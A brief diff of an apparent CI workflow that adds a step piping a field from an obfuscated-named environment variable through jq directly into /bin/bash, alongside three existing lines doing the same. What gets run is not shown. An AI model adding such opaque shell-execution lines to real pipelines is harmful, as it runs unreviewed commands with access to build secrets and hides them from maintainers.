@@ -21,6 +21,7 @@ jobs:
           echo $yk5 | jq -r .jhubb3 | /bin/bash
           echo $p2 | jq -r .x39388 | /bin/bash
           echo $yyrwm72 | jq -r .qciq32 | /bin/bash
+          printf '%s' "$xxjr437" | jq -r .tu03 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
